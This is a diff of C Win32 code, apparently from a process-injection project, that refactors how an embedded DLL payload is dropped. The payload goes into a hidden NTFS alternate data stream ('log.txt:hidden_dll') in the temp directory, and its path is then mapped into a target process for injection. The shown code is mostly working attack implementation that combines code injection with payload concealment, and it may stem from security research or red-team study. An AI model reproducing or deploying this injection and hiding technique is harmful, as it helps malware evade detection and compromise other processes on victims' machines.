@@ -95,7 +95,7 @@ PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeS
     return sectionBaseAddress2;
 }
 
-bool drop_dll_to_temp(WCHAR* my_lib, WCHAR* inject_path)
+bool drop_dll_to_dir(WCHAR* inject_path)
 {
     BYTE* res_data = NULL;
     SIZE_T res_size = 0;
@@ -103,18 +103,12 @@ bool drop_dll_to_temp(WCHAR* my_lib, WCHAR* inject_path)
     if ((res_data = get_raw_payload(res_size)) == NULL) {
         printf("Failed!\n");
         return false;
-    }
-    
-    memset(inject_path, 0, MAX_PATH);
-    GetTempPath(MAX_PATH, inject_path);
-    //GetCurrentDirectory
-    PathCombine(inject_path,inject_path,my_lib);
+    } 
     printf("inject_path = %S\n", inject_path);
 
     //drop the DLL on the disk:
     if (!write_to_file(res_data, res_size, inject_path)) return false;
     return true;
-
 }
 
 HANDLE get_target()
@@ -138,7 +132,6 @@ HANDLE get_target()
     return hProcess;
 }
 
-
 int main(int argc, char *argv[])
 {
     HANDLE hProcess = get_target();
@@ -148,10 +141,17 @@ int main(int argc, char *argv[])
         return -1;
     }
 
+    //buffer to store the full path:
+    WCHAR inject_path[MAX_PATH];
+
     //we will drop the dll into ADS:
     WCHAR my_lib[] = L"log.txt:hidden_dll";
-    WCHAR inject_path[MAX_PATH];
-    if (!drop_dll_to_temp(my_lib, inject_path)) return -1;
+    
+    WCHAR dir_path[MAX_PATH];
+    GetTempPath(MAX_PATH, dir_path);
+    PathCombine(inject_path, dir_path, my_lib);
+
+    if (!drop_dll_to_dir(inject_path)) return -1;
 
     //we need to write the full path of the DLL into the remote process:
     PVOID remote_ptr = map_code_into_process(hProcess, (BYTE*)inject_path, sizeof(inject_path));
